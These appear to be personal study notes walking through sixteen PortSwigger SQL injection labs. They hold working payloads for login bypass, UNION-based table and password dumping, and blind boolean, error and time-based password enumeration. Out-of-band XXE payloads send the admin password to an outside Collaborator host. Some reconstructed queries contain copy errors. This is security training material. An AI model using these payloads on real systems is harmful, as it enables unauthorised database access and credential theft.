### Table of Contents
1.  SQLi: Vulnerability in `WHERE` clause allowing _retrieval of hidden data_
2.  SQLi: Vulnerability allowing `login bypass`
3.  SQLi: `UNION` attack determining the `num of columns` returned by the query
4.  SQLi: `UNION` attack, finding a `column` containing _text_
5.  SQLi: `UNION` attack, retrieving `data` from other _tables_
6.  SQLi: `UNION` attack, retrieving `multiple values` in a _single column_
7.  SQLi: Querying the `database type` and `version` on _Oracle_
8.  SQLi: Querying the `database type` and `version` on _MySQL & Microsoft_
9.  SQLi: Listing the `database contents` on _non Oracle_ DBs
10. SQLi: Listing the `database contents` on _Oracle_
11. Blind SQL: With _conditional responses_
12. Blind SQL: With _conditional errors_
13. Blind SQL: With _time delays_
14. Blind SQL: With `time delays` and _information retrieval_
15. Blind SQL: With `out-of-band` _interaction_
16. Blind SQL: With `out of band` _data exfiltration_

-------------------------------------------------------------
-------------------------------------------------------------

### 1. SQLi: Vulnerability in `WHERE` clause allowing _retrieval of hidden data_

[Assessed `SQL Query` in Background]:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

+ This was given to use by _Portswigger_

-- - - - - - - - - - - - - - - - - - - - - - - - - - --

[Final Payload]:
' or 1=1 --

Probable Back-end Query:
`SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1`
+ Remember that `--` is the _comment_ symbol in `SQL`
+ `--` is the _comment_ symbol in `SQL`

-------------------------------------------------------------
-------------------------------------------------------------

### 2.  SQLi: Vulnerability allowing `login bypass`

[Assessed `SQL Query` in Background]:
SELECT firstname FROM users where username='admin' and password='admin'

-- - - - - - - - - - - - - - - - - - - - - - - - - - --

[Final Payload]:
administrator'--

Probable Back-end Query:
`SELECT firstname FROM users where username='administrator'--' and password='admin'`
+ `--` is the _comment_ symbol in `SQL`

-------------------------------------------------------------
-------------------------------------------------------------

### 3.  SQLi: `UNION` attack determining the `num of columns` returned by the query

[Assessed `SQL Query` in Background]:
select a, b from table1

-- - - - - - - - - - - - - - - - - - - - - - - - - - --

[Final Payload]:
' ORDER BY 3--

Probable Back-end Query:
`select a, b from table1 order by 3--`

-------------------------------------------------------------
-------------------------------------------------------------

### 4.  SQLi: `UNION` attack, finding a `column` containing `text`
+ I know there are **3 columns** for step 3 example

[Assessed `SQL Query` in Background]:
select a, b from table1

-- - - - - - - - - - - - - - - - - - - - - - - - - - --

```Probing_Payloads
' UNION select NULL, NULL, NULL--
' UNION select 'a', NULL, NULL--   <--- this doesn't error out
                                        so 3rd column is a string
' UNION select NULL, 'a', NULL--   <--- this doesn't error out
                                        so 2nd column is a string
' UNION select NULL, NULL,'a'--
```
[Final Payload]:
' UNION select NULL, 'kSzxY4', NULL--

Probable Back-end Query:
`select a, b from table1 UNION select NULL, 'kSzxY4', NULL`

-------------------------------------------------------------
-------------------------------------------------------------

### 5.  SQLi: `UNION` attack, retrieving `data` from other `tables`
+ I know there are **3 columns** for step 3 example
+ I know that **column 1 & 2** are `strings` from step 4 example

[Assessed `SQL Query` in Background]:
select a, b from table1

-- - - - - - - - - - - - - - - - - - - - - - - - - - --

[Final Payload]:
' UNION select username, password from users--

Probable Back-end Query:
`select a, b from table1 UNION select NULL, 'kSzxY4', NULL`

* You should get **administartor username and password here**

-------------------------------------------------------------
-------------------------------------------------------------

### 6.  SQLi: `UNION` attack, retrieving `multiple values` in a `single column`
+ `' order by 3--` errored for there are **2 columns**
+ `' UNION SELECT NULL, 'a'--` didn't error so **2nd column is string**

[Assessed `SQL Query` in Background]:
select a, b from table1

-- - - - - - - - - - - - - - - - - - - - - - - - - - --

```Final_Payloads
' UNION select NULL, username from users--
' UNION select NULL, password from users--
' UNION select NULL, @@version--           <-- ths revealed Postgre is used
' UNION select NULL, username || '*' || password from users--
```

```Probable_Back-end_Queries
select a, b from table1 UNION select NULL, username for users--
select a, b from table1 UNION select NULL, password for users--
select a, b from table1 UNION select NULL, username || '*' || password for users--
```

-------------------------------------------------------------
-------------------------------------------------------------

### 7.  SQLi: Querying the `database type` and `version` on `Oracle`
+ Oracle `SELECT` statement **MUST HAVE** a `FROM` clause
+ Oracle has a **DUAL table** which is a _special table_
+ Oracle `comment` is `--`

``` What_columns_have_text
' UNION SELECT 'a', 'a' from DUAL--
```
``` What_version
' UNION SELECT banner, NULL from v$version--
```

-------------------------------------------------------------
-------------------------------------------------------------

### 8.  SQLi: Querying the `database type` and `version` on `MySQL & Microsoft`
+ MySQL `comment` is `#`

``` What_columns_have_text
' UNION SELECT 'a', 'a' #
```
``` What_version
' UNION SELECT @@version, NULL#
```
-------------------------------------------------------------
-------------------------------------------------------------

### 9.  SQLi: Listing the `database contents` on `non Oracle` DBs
+ 2 columns and both accept text
+ Most DBs accept `--` as a comment
+ Table names for _Postgre_ is `information_schema.tabes`
 - `table_name` is a uselful table name to get _table names_
+ Column names for _Postgre_ is `information_schema.columns`
 - `column_name` is a useful table name to get _column names_

```What_Version
' UNION SELECT @@version, NULL-- didn't work, not Microsoft
' UNION SELECT version(), NULL-- worked (200) response, Postgre
```

```List_Table_Names_Postgre
' UNION SELECT table_name, NULL FROM information_schema.columns--

Output: users_xacgms
```

```List_Column_Names_Postgre
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE talbe_name= 'users_xacgms'--

Output:
        username_pxqwui
        password_bfvoxs
```

```Output_the_Usernames_and_Passwords
' UNION select username_pxqwui, password_bfvoxs from users_xacgsm--
```

-------------------------------------------------------------
-------------------------------------------------------------

### 10. SQLi: Listing the `database contents` on `Oracle`

```List_Table_Names_Postgre
' UNION SELECT table_name, NULL FROM all_tables--

Output: USERS_JYPOMG
```

```List_Column_Names_Postgre
' UNION SELECT column_name, NULL FROM all_tables WHERE talbe_name= 'USERS_JYPOMG'--

Output:
        USERNAME_LDANZP
        PASSWORD_DYZWEQ
```

```Output_the_Usernames_and_Passwords
' UNION select USERNAME_LDANZP, PASSWORD_DYZWEQ from USERS_JYPOMG--
```

-------------------------------------------------------------
-------------------------------------------------------------

### 11. Blind SQL: With `conditional responses`
+ Use **BURP REPEATER**
+ Cookie have value: `trackingId = 'RvLfBu6s9EZRlVYN'`

- - - - - - - - - - - - - - - - -

**True / False SQL Injection**
`' and 1=1--`
`' and 1=0--`

- - - - - - - - - - - - - - - - -

**Confirm that we have a users table**
[Final Payload]: ' and (select 'x' from users LIMIT 1)='x'--
+ If `users table` _doesn't exist_, you _won't get a success_
+ If `users table` _DOES exist_, you will see `x` in the _output_
+ If there **IS** a `users` table, 
 - output `x` for _each entry in user's table_
+ Use `LIMIT 1` so it doesn't destroy your query

+ Probable Back-End Query:
`select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select 'x' from users LIMIT 1)='x'--'`

- - - - - - - - - - - - - - - - -

**Confirm that username administartor exists in users table**
[Final Payload]: ' and (select username from users where username='administrator')='administrator'--
+ Will output `administrator` is this _query is true_
 - If _no output_, then `administrator` _does not exist_

+ Probable Back-End Query:
`select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator')='administrator'--'`

- - - - - - - - - - - - - - - - -

**Enumerate the password of the admin user**
```Enumerate_Length
select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--'

  ... Keep prodding (50, 30, 20, 19, etc.) until ...
  
select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--'
```
+ Use `LENGTH`
+ Use **BURP INTRUDER** for the _numeric value_ being enumerated
+ You can use **BURP INTRUDER** to probe number after `LENGTH(password)>`

```Enumerate_Characters
select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='a'--'
  ...
select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,2,1) from users where username='administrator')='z'--'
 ...
In theory you can do this for each caracter
```

This is autmoated with **BURP'S CLUSTER BOMB** feature
```
select tracking-id from tracking-table where trackingId = 'RvLfBu6s9EZRlVYN' and (select substring(password,$2$,1) from users where username='administrator')='$z$'--'
```
+ You can use **BURP CLUSTER BOMB** for this
 - For second argument in `substr`: `substr(password,$1$,1)`
 - For letter looked: `='$a$'`

- - - - - - - - - - - - - - - - -


-------------------------------------------------------------
-------------------------------------------------------------

### 12. Blind SQL: With `conditional errors`

1. Prove that parameter is vulnerable
  + This is using **CONCATENATION**

`' || (select '' from dual) || '` -> oracle database
`' || (select '' from dualfiewjfow) || '` -> error (confirms sql injection)

- - - - - - - - - - - - - - - - - - - -
- - - - - - - - - - - - - - - - - - - -

2. Confirm the users table exists

`' || (select '' from users where rownum =1) || '`
+ `rownum =1` was inserted because `select ''` broke query
 - `rownum` establishes how many rows

- - - - - - - - - - - - - - - - - - - -
- - - - - - - - - - - - - - - - - - - -

3. Confirm that the administrator user exists in the users table

`' || (select '' from users where username='administrator') || '`
+ This **won't give an error either way**
 - If it _exists_, you get a `200 response`
 - If it _doesn't exist_, you just don't run the `select` portion of statement


`' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '`
+ If **`1=0` successfully runs** then the `1/0` should **never run**
 - Because `1=0` iS _FALSE_


`' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '`
+ If **`1=1` successfully runs** then the `1/0` **should RUN**
 - Cause `1=1` is _TRUE_
+ If an _Internal server error_ happens
 - This mean `administrator` user **exists**


`' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || '`
+ If a `200 response` happens
 - This user **does not exist** in database

- - - - - - - - - - - - - - - - - - - -
- - - - - - - - - - - - - - - - - - - -

4. Determine length of password

`' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || '`
-> 200 response at 50 -> length of password is less than 50
-> 20 characters
+ You can use **BURP INTRUDER** to probe number after `LENGTH(password)>`

- - - - - - - - - - - - - - - - - - - -
- - - - - - - - - - - - - - - - - - - -

5. Output the administrator password

`' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,$1$,1)='$a$') || '`
-> w is not the first character of the password
+ You can use **BURP CLUSTER BOMB** for this
 - For second argument in `substr`: `substr(password,$1$,1)`
 - For letter looked: `='$a$'`

-------------------------------------------------------------
-------------------------------------------------------------

### 13. Blind SQL: With `time delays`
+ Try all the differnt time based formats you see in cheat sheet 

[This one worked]: ' || (SELECT sleep(10))--

-------------------------------------------------------------
-------------------------------------------------------------

### 14. Blind SQL: With `time delays` and `information retrieval`

1. Confirm that the parameter is vulnerable to SQLi
`' || pg_sleep(10)--`

2. Confirm that the users table exists in the database
`' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--`
+ If `1=0` successfully works, then `pg_sleep(10)`
 - Otherwise `pg_sleep(-1)`
 - May try `(1=1)` too
 
`' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--`
+ If wait 10 seconds, then `administrator` exists

3. Enumerate the password length
`' || (select case when (username='administrator' and LENGTH(password)>20) then pg_sleep(10) else pg_sleep(-1) end from users)--`
-> length of password is 20 characters
+ You can use **BURP INTRUDER** to probe number after `LENGTH(password)>`
 - Look at **Response received** in Burp

4. Enumerate the administrator password
`' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--`
+ You can use **BURP CLUSTER BOMB** for this
 - For second argument in `substr`: `substr(password,$1$,1)`
 - For letter looked: `='$a$'`

-------------------------------------------------------------
-------------------------------------------------------------

### 15. Blind SQL: With `out-of-band interaction`
+ Trigger a **DNS Lookup**
 - Look at Cheat Sheet
+ Use **BURP Collaborator Client**
 - Should get a `URL` like: `ranomstuff.burpcollaborator.net`
 
1. Run _Burp Collaborator_
2. Enter the payload (**look at cheatsheet**)
`' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://randomstuff.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 
`
3. Click _Poll Now_ on _Burp Collaborator_
4. See if results pan out

-------------------------------------------------------------
-------------------------------------------------------------

### 16. Blind SQL: With `out of band data exfiltration`
+ Same as the above lab but with a modified payload
`' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.randomstuff.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 
`
[This was added]:
'||(SELECT password from users where username='administrator')||'.

+ Should bin the _description_ secion of _collaborator_
 - In this example it should be beginning of **domain name**
  * Example: `password.randomstuff.burpcollaborator.net`

-------------------------------------------------------------
-------------------------------------------------------------
